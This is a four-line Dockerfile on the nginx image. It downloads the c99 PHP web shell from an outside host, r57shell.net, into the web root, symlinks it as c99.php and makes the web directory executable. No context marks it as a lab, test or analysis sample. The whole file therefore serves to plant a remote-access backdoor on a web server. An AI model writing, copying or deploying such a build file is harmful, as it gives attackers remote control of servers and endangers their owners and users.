FROM nginx

ADD http://www.r57shell.net/shell/c99.txt /usr/share/nginx/html/
RUN ln -s /usr/share/nginx/html/c99.txt /usr/share/nginx/html/c99.php
RUN chmod -R 755 /usr/share/nginx/html